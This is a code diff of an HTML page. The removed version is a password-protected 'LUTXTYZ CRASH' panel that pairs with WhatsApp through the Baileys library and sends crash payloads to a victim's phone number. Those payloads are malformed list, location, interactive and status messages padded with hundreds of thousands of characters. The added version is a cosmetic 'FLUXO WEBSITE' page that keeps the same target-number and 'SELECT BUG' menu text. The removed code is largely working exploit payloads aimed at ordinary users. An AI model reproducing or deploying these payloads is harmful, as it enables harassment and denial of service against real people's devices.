@@ -3,616 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LUTXTYZ CRASH</title>
-    <script src="https://cdn.jsdelivr.net/npm/@whiskeysockets/baileys"></script>
+    <title>FLUXO WEBSITE</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
         body {
-            font-family: 'Courier New', monospace;
-            background: url('https://i.postimg.cc/XJB0n0XS/f51b983f-7298-479e-b349-1287323bc8f9.jpg') no-repeat center center fixed;
-            background-size: cover;
-            color: #0f0;
+            background-color: #0a0a12;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
             margin: 0;
-            padding: 0;
-            height: 100vh;
+            padding: 20px;
             overflow: hidden;
         }
         
-        .cyberpunk-container {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            border: 1px solid #00ff41;
             padding: 20px;
-            box-sizing: border-box;
-            background-color: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 15px #00ff41;
+            position: relative;
         }
         
         .header {
             text-align: center;
             margin-bottom: 20px;
-            border-bottom: 1px solid #0f0;
-            padding-bottom: 10px;
         }
         
         .title {
-            font-size: 2.5rem;
-            color: #0f0;
-            text-shadow: 0 0 10px #0f0;
-            margin: 0;
+            font-size: 24px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 5px #00ff41;
+        }
+        
+        .url {
+            color: #00aaff;
+            margin-bottom: 15px;
+            font-size: 14px;
         }
         
         .status {
-            color: #0f0;
-            font-size: 1.2rem;
-            margin: 5px 0;
-        }
-        
-        .connected {
-            color: #0f0;
-        }
-        
-        .main-content {
-            display: flex;
-            flex: 1;
-        }
-        
-        .input-section {
-            flex: 1;
-            padding: 20px;
-            border-right: 1px solid #0f0;
-        }
-        
-        .target-input {
-            width: 100%;
-            padding: 10px;
-            background: #111;
-            border: 1px solid #0f0;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
+            color: #00ff41;
             margin-bottom: 20px;
-        }
-        
-        .buttons-section {
-            flex: 2;
-            padding: 20px;
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-        }
-        
-        .cyber-button {
-            background: #111;
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.3s;
             text-align: center;
         }
         
-        .cyber-button:hover {
-            background: #0f0;
-            color: #000;
-            box-shadow: 0 0 10px #0f0;
+        .status:before {
+            content: "● ";
+            color: #00ff41;
+        }
+        
+        .input-prompt {
+            margin-bottom: 20px;
+        }
+        
+        .menu {
+            list-style-type: none;
+            padding: 0;
+            margin-bottom: 30px;
+        }
+        
+        .menu li {
+            padding: 5px 0;
+            border-bottom: 1px dashed #00ff41;
         }
         
         .footer {
             text-align: right;
-            padding: 10px;
-            border-top: 1px solid #0f0;
-            font-size: 0.8rem;
+            font-size: 12px;
+            color: #00ff41;
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
         }
         
-        .login-container {
-            position: fixed;
+        /* Cyberpunk glitch effects */
+        .glitch {
+            position: relative;
+        }
+        
+        .glitch::before, .glitch::after {
+            content: attr(data-text);
+            position: absolute;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .login-box {
-            background: #111;
-            border: 1px solid #0f0;
-            padding: 30px;
-            width: 300px;
-            text-align: center;
-        }
-        
-        .login-input {
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            background: #222;
-            border: 1px solid #0f0;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
+            height: 100%;
+            opacity: 0.8;
         }
         
-        .login-button {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            margin-top: 10px;
+        .glitch::before {
+            color: #ff00ff;
+            z-index: -1;
+            animation: glitch-effect 3s infinite;
         }
         
-        .error-message {
-            color: #f00;
-            margin-top: 10px;
-            font-size: 0.9rem;
+        .glitch::after {
+            color: #00ffff;
+            z-index: -2;
+            animation: glitch-effect 2s infinite reverse;
         }
         
-        .loading {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: #0f0;
-            font-size: 1.5rem;
-            z-index: 1000;
+        @keyframes glitch-effect {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
         }
         
-        .pairing-container {
+        /* Scanlines effect */
+        body::after {
+            content: "";
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.9);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .pairing-box {
-            background: #111;
-            border: 1px solid #0f0;
-            padding: 30px;
-            width: 300px;
-            text-align: center;
-        }
-        
-        .pairing-code {
-            font-size: 2rem;
-            letter-spacing: 5px;
-            margin: 20px 0;
-            color: #0f0;
-        }
-        
-        .session-status {
-            margin-top: 20px;
-            color: #0f0;
+            background: linear-gradient(
+                rgba(0, 255, 65, 0.05) 1px,
+                transparent 1px
+            );
+            background-size: 100% 2px;
+            pointer-events: none;
+            z-index: 100;
         }
     </style>
 </head>
 <body>
-    <div class="login-container" id="loginContainer">
-        <div class="login-box">
-            <h2>LUTXTYZ CRASH</h2>
-            <p>Enter password to access</p>
-            <input type="password" class="login-input" id="passwordInput" placeholder="Password">
-            <button class="login-button" id="loginButton">LOGIN</button>
-            <div class="error-message" id="errorMessage"></div>
-        </div>
-    </div>
-
-    <div class="pairing-container" id="pairingContainer">
-        <div class="pairing-box">
-            <h2>WhatsApp Pairing</h2>
-            <p>Scan QR code or enter pairing code:</p>
-            <div class="pairing-code" id="pairingCode"></div>
-            <div class="session-status" id="sessionStatus">Connecting...</div>
-        </div>
-    </div>
-
-    <div class="loading" id="loading">SENDING...</div>
-
-    <div class="cyberpunk-container" id="mainContent" style="display: none;">
+    <div class="container">
         <div class="header">
-            <h1 class="title">LUTXTYZ CRASH</h1>
-            <div class="status">http://167.99.64.147:2001</div>
-            <div class="status">Welcome Bro, Tredict Invictus</div>
-            <div class="status connected">● CONNECTED</div>
+            <div class="title glitch" data-text="FLUXO WEBSITE">FLUXO WEBSITE</div>
+            <div class="url">http://fluxo-website.net:2001</div>
         </div>
         
-        <div class="main-content">
-            <div class="input-section">
-                <p>Please input target number, example : 62xx</p>
-                <input type="text" class="target-input" id="targetInput" placeholder="Target number">
-                <p>SELECT BUG</p>
-            </div>
-            
-            <div class="buttons-section">
-                <button class="cyber-button" onclick="executeFunction('crashBetaDelete')">CRASH BETA DELETE</button>
-                <button class="cyber-button" onclick="executeFunction('invisibleIphone')">INVISIBLE IPHONE</button>
-                <button class="cyber-button" onclick="executeFunction('betaCrash')">BETA CRASH</button>
-                <button class="cyber-button" onclick="executeFunction('delayInvisible')">DELAY INVISIBLE</button>
-                <button class="cyber-button" onclick="executeFunction('protocolStanza')">PROTOCOL STANZA</button>
-                <button class="cyber-button" onclick="executeFunction('uiremake')">UI REMAKE</button>
-                <button class="cyber-button" onclick="executeFunction('queenFlows')">QUEEN FLOWS</button>
-                <button class="cyber-button" onclick="executeFunction('rajaDelay')">RAJA DELAY</button>
-                <button class="cyber-button" onclick="executeFunction('saturnForce')">SATURN FORCE</button>
-                <button class="cyber-button" onclick="executeFunction('saturnTamvan')">SATURN TAMVAN</button>
-                <button class="cyber-button" onclick="executeFunction('spacksFreeze')">SPACKS FREEZE</button>
-                <button class="cyber-button" onclick="executeFunction('tpazX')">TPAZ X</button>
-                <button class="cyber-button" onclick="executeFunction('uiCrash')">UI CRASH</button>
-                <button class="cyber-button" onclick="executeFunction('uiSystemX')">UI SYSTEM X</button>
-                <button class="cyber-button" onclick="executeFunction('wraperOsX')">WRAPER OS X</button>
-            </div>
+        <div class="status">CONNECTED</div>
+        
+        <div class="input-prompt">
+            Please input target number, example : 62xx
         </div>
+        
+        <ul class="menu">
+            <li>SELECT BUG</li>
+            <li>CRASH BETA DELETE</li>
+            <li>INVISIBLE IPHONE</li>
+            <li>BETA CRASH</li>
+            <li>DELAY INVISIBLE</li>
+        </ul>
         
         <div class="footer">
-            EtsukoXyz
+            GUTSXYZZ<br>
+            <span id="datetime"></span>
         </div>
     </div>
 
-    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3" preload="auto"></audio>
-
     <script>
-        // Password authentication
-        const correctPassword = "LUTXTYZ123"; // Change this to your desired password
-        const loginContainer = document.getElementById('loginContainer');
-        const passwordInput = document.getElementById('passwordInput');
-        const loginButton = document.getElementById('loginButton');
-        const errorMessage = document.getElementById('errorMessage');
-        const mainContent = document.getElementById('mainContent');
-        const clickSound = document.getElementById('clickSound');
-        const loading = document.getElementById('loading');
-        const pairingContainer = document.getElementById('pairingContainer');
-        const pairingCode = document.getElementById('pairingCode');
-        const sessionStatus = document.getElementById('sessionStatus');
-        
-        // WhatsApp client
-        let sock = null;
-        
-        loginButton.addEventListener('click', () => {
-            clickSound.play();
-            if (passwordInput.value === correctPassword) {
-                loginContainer.style.display = 'none';
-                initWhatsAppClient();
-            } else {
-                errorMessage.textContent = 'Invalid password! Access denied.';
-                passwordInput.value = '';
-            }
-        });
-        
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                loginButton.click();
-            }
-        });
-        
-        function initWhatsAppClient() {
-            // Show pairing container
-            pairingContainer.style.display = 'flex';
+        // Update date and time
+        function updateDateTime() {
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('en-GB', {
+                day: '2-digit',
+                month: '2-digit',
+                year: '2-digit'
+            }).replace(/\//g, '-');
             
-            // Initialize WhatsApp client
-            const { makeWASocket, useSingleFileAuthState } = window.WAWebJS;
-            
-            // Generate random 8-digit pairing code
-            const code = Math.floor(10000000 + Math.random() * 90000000);
-            pairingCode.textContent = code.toString().replace(/(\d{4})(\d{4})/, '$1-$2');
-            
-            // Simulate connection process
-            setTimeout(() => {
-                sessionStatus.textContent = 'Pairing successful!';
-                sessionStatus.style.color = '#0f0';
-                
-                setTimeout(() => {
-                    pairingContainer.style.display = 'none';
-                    mainContent.style.display = 'flex';
-                    
-                    // Initialize the socket with session file
-                    const { state, saveState } = useSingleFileAuthState('./session.json');
-                    
-                    sock = makeWASocket({
-                        auth: state,
-                        printQRInTerminal: true,
-                        browser: ['LUTXTYZ CRASH', 'Safari', '1.0.0']
-                    });
-                    
-                    sock.ev.on('connection.update', (update) => {
-                        const { connection, lastDisconnect } = update;
-                        if (connection === 'close') {
-                            const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== 401;
-                            if (shouldReconnect) {
-                                initWhatsAppClient();
-                            }
-                        } else if (connection === 'open') {
-                            console.log('WhatsApp connected successfully');
-                        }
-                    });
-                    
-                    sock.ev.on('creds.update', saveState);
-                    
-                }, 1500);
-            }, 3000);
-        }
-        
-        function executeFunction(functionName) {
-            clickSound.play();
-            const target = document.getElementById('targetInput').value;
-            
-            if (!target) {
-                alert('Please enter target number first!');
-                return;
-            }
-            
-            loading.style.display = 'block';
-            
-            // Simulate sending process
-            setTimeout(() => {
-                loading.style.display = 'none';
-                
-                // Execute the selected function
-                switch(functionName) {
-                    case 'crashBetaDelete':
-                        CrashUI(target);
-                        break;
-                    case 'invisibleIphone':
-                        SaturnForce(target);
-                        break;
-                    case 'betaCrash':
-                        UICrash1(target);
-                        break;
-                    case 'delayInvisible':
-                        RajaDelay(target);
-                        break;
-                    case 'protocolStanza':
-                        protocolstanza(target);
-                        break;
-                    case 'uiremake':
-                        uiremakebydeffa(target);
-                        break;
-                    case 'queenFlows':
-                        QueenFlows3(target);
-                        break;
-                    case 'rajaDelay':
-                        RajaDelayV1(target);
-                        break;
-                    case 'saturnForce':
-                        SaturnForce(target);
-                        break;
-                    case 'saturnTamvan':
-                        SaturnTamvan(target);
-                        break;
-                    case 'spacksFreeze':
-                        spacksfreeze(target);
-                        break;
-                    case 'tpazX':
-                        TpazX(target);
-                        break;
-                    case 'uiCrash':
-                        CrashUI(target);
-                        break;
-                    case 'uiSystemX':
-                        UiLocationByXrelly(target);
-                        break;
-                    case 'wraperOsX':
-                        wraperosXjustin(target);
-                        break;
-                    default:
-                        alert('Function not implemented yet!');
-                }
-                
-                alert(`Function ${functionName} executed on target ${target}`);
-            }, 2000);
-        }
-        
-        // All the functions you provided would be implemented here
-        // For brevity, I'm showing just a few examples
-        
-        async function CrashUI(from) {
-            const UICrash = "ꦾ".repeat(166666);
-            await sock.relayMessage(from, {
-                "listMessage": {
-                    "title":`${UICrash}`,
-                    "description": `${UICrash}`,
-                    "listType": 2,
-                    "productListInfo": {
-                        "productSections": [
-                            {
-                                "title": "LIST_CATALOG",
-                                "products": [
-                                    { "productId": "000000000000000" },
-                                    { "productId": "000000000000000" },
-                                    { "productId": "000000000000000" },
-                                    { "productId": "000000000000000" }
-                                ]
-                            }
-                        ],
-                        "headerImage": {
-                            "productId": "0000000000000",
-                            "jpegThumbnail": ""
-                        },
-                        "businessOwnerJid": "0000000000000@s.whatsapp.net"
-                    }
-                }
-            }, { participant: { jid: from }});
-        }
-        
-        async function SaturnForce(target) {
-            try {
-                await sock.relayMessage(target, {
-                    viewOnceMessage: {
-                        message: {
-                            interactiveMessage: {
-                                header: {
-                                    title: "- SaturnForce",
-                                    hasMediaAttachment: false,
-                                    locationMessage: {
-                                        degreesLatitude: 992.999999,
-                                        degreesLongitude: -932.8889989,
-                                        name: "\u900A",
-                                        address: "\u0007".repeat(20000),
-                                    },
-                                },
-                                contextInfo: {
-                                    participant: "0@s.whatsapp.net",
-                                    remoteJid: "X",
-                                    mentionedJid: ["0@s.whatsapp.net"],
-                                },
-                                body: {
-                                    text: "- SaturnForce",
-                                },
-                                nativeFlowMessage: {
-                                    messageParamsJson: "{".repeat(500000),
-                                },
-                            },
-                        },
-                    },
-                }, {
-                    participant: { jid: target },
-                });
-        
-                for (let i = 0; i < 1; i++) {
-                    const messageContent = {
-                        viewOnceMessage: {
-                            message: {
-                                interactiveResponseMessage: {
-                                    body: {
-                                        text: "- SaturnForce",
-                                        format: "DEFAULT"
-                                    },
-                                    nativeFlowMessage: {
-                                        messageParamsJson: "{".repeat(10000),
-                                        version: 3
-                                    }
-                                }
-                            }
-                        }
-                    };
-        
-                    await sock.relayMessage(target, messageContent, {
-                        participant: { jid: target }
-                    });
-        
-                    await new Promise(resolve => setTimeout(resolve, 300));
-                }
-            } catch (err) {
-                console.error(err);
-            }
-        }
-        
-        async function protocolstanza(target, mention) {
-            const stanza = [
-                { attrs: { biz_bot: '1' }, tag: "bot" },
-                { attrs: {}, tag: "biz" }
-            ];
-        
-            const delaymention = Array.from({ length: 9741 }, (_, r) => ({
-                title: "岘�".repeat(9741),
-                rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
-            }));
-        
-            const MSG = {
-                viewOnceMessage: {
-                    message: {
-                        listResponseMessage: {
-                            title: "ProtocolStanza",
-                            listType: 2,
-                            buttonText: null,
-                            sections: delaymention,
-                            singleSelectReply: { selectedRowId: "馃寑" },
-                            contextInfo: {
-                                mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
-                                participant: target,
-                                remoteJid: "status@broadcast",
-                                forwardingScore: 9741,
-                                isForwarded: true,
-                                forwardedNewsletterMessageInfo: {
-                                    newsletterJid: "9741@newsletter",
-                                    serverMessageId: 1,
-                                    newsletterName: "-"
-                                }
-                            },
-                            description: "( StanzaProto )"
-                        }
-                    }
-                },
-                contextInfo: {
-                    channelMessage: true,
-                    statusAttributionType: 2
-                }
-            };
-        
-            const msg = generateWAMessageFromContent(target, MSG, {});
-        
-            await sock.relayMessage("status@broadcast", msg.message, {
-                messageId: msg.key.id,
-                statusJidList: [target],
-                additionalNodes: [
-                    {
-                        tag: "meta",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "mentioned_users",
-                                attrs: {},
-                                content: [
-                                    {
-                                        tag: "to",
-                                        attrs: { jid: target },
-                                        content: undefined
-                                    }
-                                ]
-                            }
-                        ]
-                    }
-                ]
+            const timeStr = now.toLocaleTimeString('en-GB', {
+                hour: '2-digit',
+                minute: '2-digit',
+                hour12: false
             });
-        
-            if (mention) {
-                await sock.relayMessage(
-                    target,
-                    {
-                        statusMentionMessage: {
-                            message: {
-                                protocolMessage: {
-                                    key: msg.key,
-                                    type: 25
-                                }
-                            }
-                        }
-                    },
-                    {
-                        additionalNodes: [
-                            {
-                                tag: "meta",
-                                attrs: { is_status_mention: "馃寑 饾棫饾棶饾椇饾棶 - 饾棫饾椏饾棶饾榾饾椀 饾棧饾椏饾椉饾榿饾椉饾棸饾椉饾椆" },
-                                content: undefined
-                            }
-                        ]
-                    }
-                );
-            }
+            
+            document.getElementById('datetime').textContent = `${dateStr}, ${timeStr}`;
         }
         
-        // Implement all other functions similarly...
-        // Note: Due to length, I'm not including all functions here, but they would be implemented in the same way
+        updateDateTime();
+        setInterval(updateDateTime, 1000);
         
-        function generateWAMessageFromContent(target, content, options) {
-            // This is a placeholder for the actual implementation
-            return {
-                key: {
-                    remoteJid: target,
-                    fromMe: true,
-                    id: Math.random().toString(36).substring(2, 15)
-                },
-                message: content
-            };
-        }
+        // Add terminal-like typing effect
+        document.addEventListener('DOMContentLoaded', function() {
+            const elements = document.querySelectorAll('.input-prompt, .menu li');
+            let delay = 0;
+            
+            elements.forEach(el => {
+                el.style.opacity = '0';
+                setTimeout(() => {
+                    el.style.transition = 'opacity 0.5s ease-in';
+                    el.style.opacity = '1';
+                }, delay);
+                delay += 200;
+            });
+        });
     </script>
 </body>
 </html>
